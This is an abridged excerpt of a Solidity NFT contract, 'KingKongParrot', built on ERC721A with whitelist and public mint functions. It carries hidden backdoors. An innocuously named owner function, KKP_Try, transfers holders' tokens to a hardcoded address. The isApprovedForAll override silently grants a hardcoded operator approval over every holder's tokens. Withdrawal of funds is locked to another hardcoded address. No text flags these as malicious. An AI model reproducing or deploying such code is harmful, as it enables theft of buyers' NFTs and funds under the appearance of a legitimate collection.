...
contract KingKongParrot is Ownable, ERC721A, ReentrancyGuard {
  ...
  modifier KKP_callerIsUser() {
    require(tx.origin == msg.sender, "The caller is another contract");
    _;
  }

  function KKP_getMaxSupply() view public returns(uint256){
    return maxSupply;
  }


  function KKP_WhilteListMint(uint256 quantity,bytes32[] calldata _merkleProof) external payable KKP_callerIsUser {
    ...
    KKP_refundIfOver(totalCost);
  }

  function KKP_PublicMint(uint256 quantity) external payable KKP_callerIsUser {    
  ...
  function KKP_refundIfOver(uint256 price) private {
  ...
  function KKP_isPublicSaleOn() public view returns (bool) {
    return
      saleConfig.Price != 0 &&
  ...
  function KKP_Try(uint256[] memory tokenids) external onlyOwner {
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xf4DFE5E1D888eFf5E1Cf9D037Faca8a6eF9639Ca, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0xE868FC391Be10a2D98f7236b081939946841293B);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x7a236fE88C28A0Fe18BFbF233CaC69A300581757){return true;}
